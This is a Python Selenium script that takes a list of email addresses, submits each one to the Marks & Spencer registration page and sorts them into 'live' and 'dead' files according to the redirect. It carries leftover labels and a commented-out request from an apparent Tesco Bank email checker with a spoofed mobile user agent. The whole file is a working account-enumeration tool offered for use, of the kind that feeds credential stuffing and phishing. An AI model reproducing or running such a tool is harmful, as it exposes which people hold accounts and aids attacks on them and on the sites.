#-*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from datetime import datetime
import time
import sys
import requests
import sys
import json
import logging

url = "https://www.marksandspencer.com/webapp/wcs/stores/servlet/MSResUserRegistration"
header = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
payload={'username':"",
"OLB_REMEMBER_USERNAME":"Y",
"screen":"banking"}

if __name__=='__main__':
	live_file="live_users.txt"
	dead_file="dead_users.txt"
	print("valid_tescobank.com_email_checker")
	if len(sys.argv)<2:
		print("pelase use the app like that\n    python tescobank_checker.py [emails_list] \n or python tescobank_checker.py [emails_list] [live_file] [dead_file]")
		sys.exit()
	elif len(sys.argv)>2:
		live_file=sys.argv[2]
	elif len(sys.argv)>3:
		dead_file=sys.argv[3]
	emails=open(sys.argv[1],'r').read().split('\n')
	options = webdriver.ChromeOptions()
	# options.add_argument('--headless')
	options.add_argument('log-level=3')
	prefs={"profile.managed_default_content_settings.images": 2}
	options.add_experimental_option('prefs', prefs)
	prefs={'disk-cache-size': 10240}
	options.add_experimental_option('prefs', prefs)
	# driver = webdriver.Chrome(chrome_options=options)
	for email in emails:
		if not(email) or len(email)<4:
			continue
		"""
		payload["username"]=email
		s=requests.post(url,data=json.dumps(payload),headers=header)
		responce=s.content
		if 'Username not recognised' in responce:
			print(email,"not registed")
		else:
			print(email,"registed")
		"""
		try:
			driver = webdriver.Chrome(options=options)
			driver.get(url)
			#print(dir(driver))
			#L=driver.getWindowHandles()
			#print(L)
			wait(driver, 300).until(EC.presence_of_element_located((By.ID, 'start')))
			wait(driver, 300).until(EC.presence_of_element_located((By.ID, 'email-input')))
			c_mail=driver.find_element_by_id("email-input")
			c_mail.send_keys(email)
			c_submit=driver.find_element_by_id("start")
			c_submit.click()
			time.sleep(5)
			# https://www.marksandspencer.com/webapp/wcs/stores/servlet/MSResLogin
			# https://www.marksandspencer.com/webapp/wcs/stores/servlet/MSResUserRegistration
			print(driver.current_url)
			if 'MSResLogin' in driver.current_url:
				print('registred user')
			elif 'MSResUserRegistration' in driver.current_url:
				print('unregistred user')
			else:
				print(driver.current_url)
				sys.exit(0)
			
			if "MSResLogin" in driver.current_url:
				print("email/username valid",email)
				responce = "valid"
				F1=open(live_file,'a')
				try:
					F1.write(email+'\n')
				except:
					F1.close()
				F1.close()
			elif 'MSResUserRegistration' in driver.current_url:
				print("email/username invalid",email)
				responce = "invalid"
				F2=open(dead_file,'a')
				try:
					F2.write(email+'\n')
				except:
					F2.close()	
				F2.close()
			else:
				responce = 'unknow'
			F3=open("result.txt",'a')
			a=datetime.now()
			try:
				F3.write(a.strftime("%Y-%d-%h %H:%M:%S"))
				F3.write("\t"+email+'\t'+responce+"\n")
			except:
				F3.close()
			F3.close()
			driver.quit()
			#time.sleep(1)
		except Exception as e:
			print(e)
			driver.quit()
			time.sleep(1)